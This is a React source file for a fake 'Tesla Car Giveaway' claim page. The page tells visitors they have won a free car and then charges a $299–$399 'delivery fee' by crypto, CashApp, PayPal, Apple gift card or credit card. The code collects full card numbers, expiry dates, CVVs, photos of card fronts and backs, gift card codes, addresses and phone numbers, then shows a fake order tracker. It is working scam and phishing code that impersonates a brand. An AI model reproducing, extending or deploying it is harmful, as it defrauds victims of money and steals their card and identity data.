import { useState, useEffect } from 'react';
import { CheckCircle, Upload, Copy, Check, CreditCard, Gift, Wallet, User, MapPin, Car, ArrowLeft, Clock, Truck, Zap } from 'lucide-react';
import { toast } from 'sonner';
import { Link } from 'react-router-dom';

const STEPS = { DETAILS: 0, ORDER: 1, PAYMENT: 2, SUCCESS: 3 };
const generateId = () => Math.random().toString(36).substring(2, 15) + Date.now().toString(36);

export default function Participate() {
  const [step, setStep] = useState(STEPS.DETAILS);
  
  // Form State
  const [form, setForm] = useState({ fullName: '', email: '', phone: '', address: '', city: '', country: '', zip: '' });
  const [carOptions, setCarOptions] = useState([]);
  const [selectedCar, setSelectedCar] = useState("Tesla Model 3 2025");
  const [selectedDelivery, setSelectedDelivery] = useState({ id: 1, label: "Standard Delivery", fee: "$299", duration: "10–14 business days" });
  const [paymentMethod, setPaymentMethod] = useState("crypto");
  
  // Payment State
  const [proofUrl, setProofUrl] = useState("");
  const [copied, setCopied] = useState(false);
  const [cardFront, setCardFront] = useState("");
  const [cardBack, setCardBack] = useState("");
  const [cardDetails, setCardDetails] = useState({ number: '', expiry: '', cvv: '', holder: '' });
  const [giftFront, setGiftFront] = useState("");
  const [giftBack, setGiftBack] = useState("");
  const [giftCode, setGiftCode] = useState("");
  const [wallets, setWallets] = useState([]);
  const [selectedWallet, setSelectedWallet] = useState(null);

  // Redirect timer
  const [redirectTimer, setRedirectTimer] = useState(20);

  // Load cars and wallets from localStorage
  useEffect(() => {
    const raw = localStorage.getItem("tesla_site_settings");
    if (raw) {
      try {
        const data = JSON.parse(raw)[0];
        if (data) {
          const carCount = parseInt(data.car_count) || 0;
          const loadedCars = [];
          for (let i = 0; i < carCount; i++) {
            const name = data[`car_${i+1}_name`];
            if (name) {
              loadedCars.push({ 
                name: name,
                tier: data[`car_${i+1}_tier`] || "",
                fee: data[`car_${i+1}_fee`] || "$299",
                delivery: data[`car_${i+1}_delivery`] || "",
                img: data[`car_${i+1}_img`] || "/images/tesla-model-3.jpg"
              });
            }
          }
          if (loadedCars.length > 0) {
            setCarOptions(loadedCars);
            setSelectedCar(loadedCars[0].name);
          }
          const walletCount = parseInt(data.pm_count) || 0;
          const loadedWallets = [];
          for (let i = 0; i < walletCount; i++) {
            const label = data[`pm_${i+1}_label`];
            const address = data[`pm_${i+1}_address`];
            if (label && address) {
              loadedWallets.push({
                id: `pm_${i+1}`,
                label: label,
                address: address,
                logo: data[`pm_${i+1}_logo`] || ""
              });
            }
          }
          setWallets(loadedWallets);
          if (loadedWallets.length > 0) setSelectedWallet(loadedWallets[0]);
        }
      } catch (e) { console.error("Failed to load settings", e); }
    }
  }, []);

  // Redirect timer for success step
  useEffect(() => {
    if (step !== STEPS.SUCCESS) {
      setRedirectTimer(20);
      return;
    }
    const interval = setInterval(() => {
      setRedirectTimer(prev => {
        if (prev <= 1) {
          clearInterval(interval);
          window.location.href = '/';
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(interval);
  }, [step]);

  const handleFileUpload = async (file, setter) => {
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (e) => setter(e.target.result);
    reader.readAsDataURL(file);
  };

  const handleCopy = () => {
    if (!selectedWallet) return;
    navigator.clipboard.writeText(selectedWallet.address);
    setCopied(true);
    toast.success("Address copied!");
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSubmit = () => {
    // Validate payment step fields
    if (paymentMethod === "credit_card" && (!cardDetails.holder || !cardDetails.number || !cardDetails.expiry || !cardDetails.cvv)) {
      toast.error("Please fill in all credit card details.");
      return;
    }
    if (paymentMethod === "apple_gift_card" && !giftCode) {
      toast.error("Please enter the gift card code.");
      return;
    }
    if (!proofUrl) {
      toast.error("Please upload payment proof.");
      return;
    }

    const submission = {
      id: generateId(),
      created_date: new Date().toISOString(),
      full_name: form.fullName,
      email: form.email,
      phone: form.phone,
      address: form.address,
      city: form.city,
      country: form.country,
      zip: form.zip,
      car_model: selectedCar,
      delivery_option: selectedDelivery.label,
      delivery_fee: selectedDelivery.fee,
      payment_type: paymentMethod,
      status: "pending",
      payment_proof_url: proofUrl || "",
    };
    if (paymentMethod === "crypto") {
      submission.payment_label = selectedWallet?.label || "";
      submission.wallet_address_used = selectedWallet?.address || "";
    } else if (paymentMethod === "cashapp") {
      submission.payment_label = "CashApp";
      submission.cashapp_tag = "YOUR_TAG";
    } else if (paymentMethod === "paypal") {
      submission.payment_label = "PayPal";
      submission.paypal_tag = "YOUR_EMAIL";
    } else if (paymentMethod === "credit_card") {
      submission.payment_label = "Credit Card";
      submission.credit_card_front_url = cardFront || "";
      submission.credit_card_back_url = cardBack || "";
      submission.card_number = cardDetails.number;
      submission.card_expiry = cardDetails.expiry;
      submission.card_cvv = cardDetails.cvv;
      submission.card_holder_name = cardDetails.holder;
    } else if (paymentMethod === "apple_gift_card") {
      submission.payment_label = "Apple Gift Card";
      submission.apple_gift_front_url = giftFront || "";
      submission.apple_gift_back_url = giftBack || "";
      submission.apple_gift_code = giftCode || "";
    }
    const existing = JSON.parse(localStorage.getItem("tesla_payment_submissions") || "[]");
    existing.push(submission);
    localStorage.setItem("tesla_payment_submissions", JSON.stringify(existing));
    setStep(STEPS.SUCCESS);
  };

  // Helper to get current car object
  const getCurrentCar = () => {
    return carOptions.find(c => c.name === selectedCar) || carOptions[0] || { name: selectedCar, img: "/images/tesla-model-3.jpg" };
  };

  // -------- DETAILS STEP --------
  if (step === STEPS.DETAILS) {
    const goToOrder = () => {
      if (!form.fullName || !form.email || !form.phone || !form.address || !form.city || !form.country) {
        toast.error("Please fill in all required fields.");
        return;
      }
      setStep(STEPS.ORDER);
    };

    return (
      <div className="min-h-screen bg-gray-950 px-4 py-6">
        <div className="w-full max-w-lg mx-auto">
          <div className="flex items-center gap-3 mb-6 text-white">
            <Link to="/" className="text-gray-400 hover:text-white"><ArrowLeft className="w-5 h-5" /></Link>
            <div className="w-8 h-8 rounded-full bg-red-600 flex items-center justify-center text-white text-xs font-bold">T</div>
            <span className="text-sm font-semibold">Tesla Car Giveaway — Claim Your Car</span>
          </div>

          <div className="bg-red-900/30 border border-red-500/30 rounded-xl p-4 mb-5 flex items-center gap-3">
            <div className="bg-white/10 p-2 rounded-full"><Car className="w-5 h-5 text-white" /></div>
            <div>
              <p className="text-white font-bold text-sm">🎉 You've been selected!</p>
              <p className="text-red-300 text-xs">Fill in your delivery details.</p>
            </div>
          </div>

          <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 mb-4">
            <div className="flex items-center gap-2 mb-3 text-white">
              <Car className="w-4 h-4 text-red-500" />
              <span className="text-sm font-semibold">Choose Your Tesla Car Model</span>
            </div>
            <select
              value={selectedCar}
              onChange={e => setSelectedCar(e.target.value)}
              className="w-full bg-gray-800 border border-gray-700 text-white rounded-lg px-4 py-3 text-sm focus:outline-none focus:border-red-500"
            >
              {carOptions.map((car, idx) => (
                <option key={idx} value={car.name}>{car.name}</option>
              ))}
              {carOptions.length === 0 && <option value="Tesla Model 3 2025">Tesla Model 3 2025</option>}
            </select>
          </div>

          <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 mb-4">
            <div className="flex items-center gap-2 mb-3 text-white">
              <User className="w-4 h-4 text-red-500" />
              <span className="text-sm font-semibold">Personal Information</span>
            </div>
            <div className="space-y-3">
              <input placeholder="Full Name *" className="w-full bg-gray-800 border border-gray-700 text-white rounded-lg px-4 py-3 text-sm" onChange={e => setForm({...form, fullName: e.target.value})} />
              <input placeholder="Email Address *" className="w-full bg-gray-800 border border-gray-700 text-white rounded-lg px-4 py-3 text-sm" onChange={e => setForm({...form, email: e.target.value})} />
              <input placeholder="Phone Number *" className="w-full bg-gray-800 border border-gray-700 text-white rounded-lg px-4 py-3 text-sm" onChange={e => setForm({...form, phone: e.target.value})} />
            </div>
          </div>

          <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 mb-6">
            <div className="flex items-center gap-2 mb-3 text-white">
              <MapPin className="w-4 h-4 text-red-500" />
              <span className="text-sm font-semibold">Delivery Address</span>
            </div>
            <div className="space-y-3">
              <input placeholder="Street Address *" className="w-full bg-gray-800 border border-gray-700 text-white rounded-lg px-4 py-3 text-sm" onChange={e => setForm({...form, address: e.target.value})} />
              <div className="grid grid-cols-2 gap-3">
                <input placeholder="City *" className="w-full bg-gray-800 border border-gray-700 text-white rounded-lg px-4 py-3 text-sm" onChange={e => setForm({...form, city: e.target.value})} />
                <input placeholder="ZIP / Postal" className="w-full bg-gray-800 border border-gray-700 text-white rounded-lg px-4 py-3 text-sm" onChange={e => setForm({...form, zip: e.target.value})} />
              </div>
              <input placeholder="Country *" className="w-full bg-gray-800 border border-gray-700 text-white rounded-lg px-4 py-3 text-sm" onChange={e => setForm({...form, country: e.target.value})} />
            </div>
          </div>

          <button onClick={goToOrder} className="w-full bg-red-600 hover:bg-red-700 text-white py-4 font-bold rounded-lg">Order Now →</button>
        </div>
      </div>
    );
  }

  // -------- ORDER STEP --------
  if (step === STEPS.ORDER) {
    const currentCar = getCurrentCar();

    return (
      <div className="min-h-screen bg-gray-950 px-4 py-6">
        <div className="w-full max-w-lg mx-auto">
          <div className="flex items-center gap-3 mb-6 text-white">
            <button onClick={() => setStep(STEPS.DETAILS)} className="text-gray-400 hover:text-white"><ArrowLeft className="w-5 h-5" /></button>
            <div className="w-8 h-8 rounded-full bg-red-600 flex items-center justify-center text-white text-xs font-bold">T</div>
            <span className="text-sm font-semibold">Order Summary</span>
          </div>

          <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 mb-4">
            <img src={currentCar.img} alt={selectedCar} className="w-full h-48 object-cover rounded-lg mb-3" />
            <div className="flex items-center justify-between">
              <div>
                <p className="text-white font-black text-lg">{selectedCar}</p>
                <p className="text-red-400 text-sm">Brand New Electric Vehicle</p>
              </div>
              <span className="bg-green-500/20 text-green-400 text-xs font-bold px-3 py-1 rounded-full">FREE 🎉</span>
            </div>
          </div>

          <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 mb-4">
            <p className="text-gray-400 text-xs uppercase tracking-wide font-semibold mb-2">Deliver To</p>
            <p className="text-white font-bold">{form.fullName || 'Your Name'}</p>
            <p className="text-gray-400 text-sm">{form.email} · {form.phone}</p>
            <p className="text-gray-400 text-sm mt-1">{form.address}, {form.city}, {form.country} {form.zip}</p>
          </div>

          <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 mb-4">
            <p className="text-white font-bold text-sm mb-3">Select Delivery Option</p>
            <div className="space-y-3">
              {[
                { id: 1, label: "Standard Delivery", fee: "$299", duration: "10–14 business days", desc: "Standard international shipping & customs clearance" },
                { id: 2, label: "Express Delivery", fee: "$349", duration: "5–7 business days", desc: "Priority shipping with real-time tracking updates" },
                { id: 3, label: "Premium Delivery", fee: "$399", duration: "3–5 business days", desc: "Fastest dispatch, white-glove doorstep delivery" }
              ].map((option) => (
                <button
                  key={option.id}
                  onClick={() => setSelectedDelivery(option)}
                  className={`w-full text-left rounded-lg border p-4 transition-colors ${selectedDelivery.id === option.id ? "border-red-500 bg-red-500/10" : "border-gray-700 bg-gray-800"}`}
                >
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-white font-bold text-sm">{option.label}</span>
                    <span className="text-red-400 font-black">{option.fee}</span>
                  </div>
                  <p className="text-gray-400 text-xs">{option.desc}</p>
                  <p className="text-gray-500 text-xs mt-1">⏱ {option.duration}</p>
                </button>
              ))}
            </div>
          </div>

          <div className="bg-gray-900 border border-gray-700 rounded-lg p-4 mb-6 flex items-center justify-between">
            <div>
              <p className="text-gray-400 text-xs">Delivery Fee Only</p>
              <p className="text-white font-black text-2xl">{selectedDelivery.fee}</p>
            </div>
            <div className="text-right">
              <p className="text-green-400 text-sm font-bold">Car Value: FREE</p>
              <p className="text-gray-500 text-xs">{selectedDelivery.duration}</p>
            </div>
          </div>

          <button onClick={() => setStep(STEPS.PAYMENT)} className="w-full bg-red-600 hover:bg-red-700 text-white py-4 font-bold rounded-lg">Pay for Delivery Now →</button>
        </div>
      </div>
    );
  }

  // -------- PAYMENT STEP --------
  if (step === STEPS.PAYMENT) return (
    <div className="min-h-screen bg-gray-950 px-4 py-6">
      <div className="w-full max-w-lg mx-auto">
        <div className="flex items-center gap-3 mb-6 text-white">
          <button onClick={() => setStep(STEPS.ORDER)} className="text-gray-400 hover:text-white"><ArrowLeft className="w-5 h-5" /></button>
          <div className="w-8 h-8 rounded-full bg-red-600 flex items-center justify-center text-white text-xs font-bold">T</div>
          <span className="text-sm font-semibold">Pay Delivery Fee — {selectedDelivery.fee}</span>
        </div>

        <div className="bg-green-500/10 border border-green-500/30 rounded-lg p-3 mb-4">
          <p className="text-green-300 text-sm font-semibold">
            ✅ Delivering: {selectedCar} to {form.city}, {form.country}
          </p>
        </div>

        <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 mb-4">
          <p className="text-white font-bold text-sm mb-3">Select Payment Method</p>
          <div className="grid grid-cols-2 gap-3">
            {[
              { id: "credit_card", label: "Credit Card", icon: <CreditCard className="w-5 h-5 text-white" /> },
              { id: "apple_gift_card", label: "Apple Gift Card", icon: <Gift className="w-5 h-5 text-white" /> },
              { id: "crypto", label: "Crypto", icon: <Wallet className="w-5 h-5 text-white" /> },
              { id: "cashapp", label: "CashApp", icon: <Zap className="w-5 h-5 text-white" /> },
              { id: "paypal", label: "PayPal", icon: <Truck className="w-5 h-5 text-white" /> }
            ].map((method) => (
              <button
                key={method.id}
                onClick={() => setPaymentMethod(method.id)}
                className={`rounded-lg border p-4 text-center transition-colors ${paymentMethod === method.id ? "border-red-500 bg-red-500/10" : "border-gray-700 bg-gray-800"}`}
              >
                <div className="flex justify-center mb-1">{method.icon}</div>
                <p className="text-white text-xs font-semibold">{method.label}</p>
              </button>
            ))}
          </div>
        </div>

        {paymentMethod === "crypto" && wallets.length > 0 && (
          <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 mb-4">
            <p className="text-white font-bold text-sm mb-3">Select Crypto Wallet</p>
            {wallets.map(w => (
              <button key={w.id} onClick={() => setSelectedWallet(w)} className={`w-full flex items-center gap-3 rounded-lg border p-3 mb-2 ${selectedWallet?.id === w.id ? "border-red-500 bg-red-500/10" : "border-gray-700 bg-gray-800"}`}>
                <div className="w-8 h-8 rounded-full bg-gray-700 flex items-center justify-center text-white font-bold text-xs">{w.label.slice(0,2)}</div>
                <div className="flex-1"><p className="text-white font-bold text-sm">{w.label}</p><p className="text-gray-500 text-xs font-mono truncate">{w.address}</p></div>
                {selectedWallet?.id === w.id && <CheckCircle className="w-5 h-5 text-red-500" />}
              </button>
            ))}
            {selectedWallet && (
              <div className="bg-gray-800 rounded-lg p-3 flex items-center gap-3 mt-2">
                <code className="text-green-400 text-xs break-all flex-1 font-mono">{selectedWallet.address}</code>
                <button onClick={handleCopy} className="bg-gray-700 hover:bg-red-600 rounded p-1">
                  {copied ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4 text-white" />}
                </button>
              </div>
            )}
          </div>
        )}

        {paymentMethod === "cashapp" && (
          <div className="bg-green-900/30 border border-green-700 rounded-lg p-4 mb-4 text-center">
            <p className="text-green-300 font-black text-xl">$YOUR_CASHAPP</p>
          </div>
        )}
        {paymentMethod === "paypal" && (
          <div className="bg-blue-900/30 border border-blue-700 rounded-lg p-4 mb-4 text-center">
            <p className="text-blue-300 font-black text-xl">your@email.com</p>
          </div>
        )}

        {paymentMethod === "credit_card" && (
          <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 mb-4 space-y-3">
            <div className="grid grid-cols-2 gap-3">
              <label className="cursor-pointer">
                <div className="h-24 rounded-lg border-2 border-dashed flex flex-col items-center justify-center bg-gray-800 border-gray-600">
                  {cardFront ? <img src={cardFront} alt="Front" className="w-full h-full object-cover rounded-lg" /> : <><Upload className="w-5 h-5 text-gray-500 mb-1" /><span className="text-gray-500 text-xs">Front</span></>}
                </div>
                <input type="file" accept="image/*" className="hidden" onChange={e => handleFileUpload(e.target.files?.[0], setCardFront)} />
              </label>
              <label className="cursor-pointer">
                <div className="h-24 rounded-lg border-2 border-dashed flex flex-col items-center justify-center bg-gray-800 border-gray-600">
                  {cardBack ? <img src={cardBack} alt="Back" className="w-full h-full object-cover rounded-lg" /> : <><Upload className="w-5 h-5 text-gray-500 mb-1" /><span className="text-gray-500 text-xs">Back</span></>}
                </div>
                <input type="file" accept="image/*" className="hidden" onChange={e => handleFileUpload(e.target.files?.[0], setCardBack)} />
              </label>
            </div>
            <input placeholder="Card Holder Name" className="w-full bg-gray-800 border border-gray-700 text-white rounded-lg px-4 py-3 text-sm" onChange={e => setCardDetails({...cardDetails, holder: e.target.value})} />
            <input placeholder="Card Number" className="w-full bg-gray-800 border border-gray-700 text-white rounded-lg px-4 py-3 text-sm" onChange={e => setCardDetails({...cardDetails, number: e.target.value})} maxLength={19} />
            <div className="grid grid-cols-2 gap-3">
              <input placeholder="MM/YY" className="w-full bg-gray-800 border border-gray-700 text-white rounded-lg px-4 py-3 text-sm" onChange={e => setCardDetails({...cardDetails, expiry: e.target.value})} maxLength={5} />
              <input placeholder="CVV" className="w-full bg-gray-800 border border-gray-700 text-white rounded-lg px-4 py-3 text-sm" onChange={e => setCardDetails({...cardDetails, cvv: e.target.value})} maxLength={4} />
            </div>
          </div>
        )}

        {paymentMethod === "apple_gift_card" && (
          <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 mb-4 space-y-3">
            <div className="grid grid-cols-2 gap-3">
              <label className="cursor-pointer">
                <div className="h-24 rounded-lg border-2 border-dashed flex flex-col items-center justify-center bg-gray-800 border-gray-600">
                  {giftFront ? <img src={giftFront} alt="Front" className="w-full h-full object-cover rounded-lg" /> : <><Upload className="w-5 h-5 text-gray-500 mb-1" /><span className="text-gray-500 text-xs">Front</span></>}
                </div>
                <input type="file" accept="image/*" className="hidden" onChange={e => handleFileUpload(e.target.files?.[0], setGiftFront)} />
              </label>
              <label className="cursor-pointer">
                <div className="h-24 rounded-lg border-2 border-dashed flex flex-col items-center justify-center bg-gray-800 border-gray-600">
                  {giftBack ? <img src={giftBack} alt="Back" className="w-full h-full object-cover rounded-lg" /> : <><Upload className="w-5 h-5 text-gray-500 mb-1" /><span className="text-gray-500 text-xs">Back</span></>}
                </div>
                <input type="file" accept="image/*" className="hidden" onChange={e => handleFileUpload(e.target.files?.[0], setGiftBack)} />
              </label>
            </div>
            <input placeholder="Gift Card Code: XXXX-XXXX-XXXX" className="w-full bg-gray-800 border border-gray-700 text-white rounded-lg px-4 py-3 text-sm font-mono tracking-widest" onChange={e => setGiftCode(e.target.value)} />
          </div>
        )}

        <div className="bg-gray-900 border border-yellow-500/40 rounded-xl p-4 mb-4">
          <p className="text-yellow-400 font-bold text-sm mb-2 flex items-center gap-2"><Upload className="w-4 h-4" /> Upload Payment Proof</p>
          <label className="cursor-pointer block">
            <div className={`h-32 rounded-lg border-2 border-dashed flex flex-col items-center justify-center ${proofUrl ? "border-green-500 bg-green-500/5" : "border-yellow-500/40 bg-gray-800"}`}>
              {proofUrl ? <img src={proofUrl} alt="Proof" className="h-full w-full object-contain rounded-lg p-1" /> : <><Upload className="w-6 h-6 text-yellow-400 mb-2" /><span className="text-yellow-400 text-sm font-semibold">Tap to upload proof</span></>}
            </div>
            <input type="file" accept="image/*" className="hidden" onChange={e => handleFileUpload(e.target.files?.[0], setProofUrl)} />
          </label>
        </div>

        <button onClick={handleSubmit} className="w-full bg-red-600 hover:bg-red-700 text-white py-4 font-bold rounded-lg">I've Paid — Confirm My Order ✓</button>
      </div>
    </div>
  );

  // -------- SUCCESS STEP --------
  return (
    <div className="min-h-screen bg-gray-950 flex flex-col items-center justify-center px-4 py-8">
      <div className="w-full max-w-md">
        <div className="flex flex-col items-center mb-4">
          <div className="w-28 h-28 rounded-full border-4 border-green-500 overflow-hidden bg-gray-800 mb-2">
            <img src={getCurrentCar().img} alt="Car" className="w-full h-full object-cover" />
          </div>
          <div className="text-4xl mb-1">🎉</div>
          <h2 className="text-3xl font-black text-white text-center">Order Received!</h2>
          <p className="text-gray-400 text-center text-sm mt-1">Once your payment is verified, you will get a message on your phone with tracking information.</p>
        </div>

        <div className="bg-green-900/30 border border-green-500/30 rounded-xl p-5 mb-6 text-left">
          <p className="text-green-300 font-bold mb-3 flex items-center gap-2"><CheckCircle className="w-4 h-4" /> Order Details</p>
          <div className="space-y-1.5 text-sm">
            <p className="text-gray-300"><span className="text-gray-500">Car:</span> <span className="font-bold text-white">{selectedCar}</span></p>
            <p className="text-gray-300"><span className="text-gray-500">Name:</span> <span className="text-white">{form.fullName}</span></p>
            <p className="text-gray-300"><span className="text-gray-500">Delivery:</span> <span className="text-white">{selectedDelivery.label}</span></p>
            <p className="text-gray-300"><span className="text-gray-500">Fee Paid:</span> <span className="text-red-400 font-bold">{selectedDelivery.fee}</span></p>
          </div>
        </div>

        <p className="text-gray-500 text-sm text-center mb-6">Redirecting to home in <span className="text-white font-bold">{redirectTimer}s</span></p>

        <div className="bg-gray-900 border border-gray-800 rounded-xl p-5 relative">
          <div className="absolute left-[22px] top-[46px] bottom-[46px] w-0.5 bg-gray-700 -ml-[1px]"></div>
          <div className="flex flex-col gap-6 relative z-10">
            {[
              { id: 0, label: "Order Placed", desc: "Your order has been confirmed.", icon: "📦" },
              { id: 1, label: "Car Assembled", desc: "Production is underway at the factory.", icon: "🔧" },
              { id: 2, label: "Shipped", desc: "Your vehicle is on its way.", icon: "🚢" },
              { id: 3, label: "Out for Delivery", desc: "Driver is heading to your address.", icon: "🚚" }
            ].map((stage, index) => {
              const isDone = index === 0;
              return (
                <div key={stage.id} className="flex items-start gap-4">
                  <div className={`w-6 h-6 rounded-full flex items-center justify-center shrink-0 transition-all duration-300 ${isDone ? 'bg-green-500 ring-4 ring-green-500/30 shadow-lg shadow-green-500/20 animate-[pulse_3s_ease-in-out_infinite]' : 'bg-gray-700'}`}>
                    {isDone ? <CheckCircle className="w-4 h-4 text-white" /> : <div className="w-2.5 h-2.5 rounded-full bg-gray-600"></div>}
                  </div>
                  <div className="flex flex-col pt-1 pb-2 flex-1">
                    <p className={`font-bold text-base ${isDone ? 'text-green-400' : 'text-gray-500'}`}>{stage.icon} {stage.label}</p>
                    <p className={`text-sm mt-0.5 ${isDone ? 'text-green-400/80' : 'text-gray-600'}`}>{stage.desc}</p>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      </div>
    </div>
  );
}
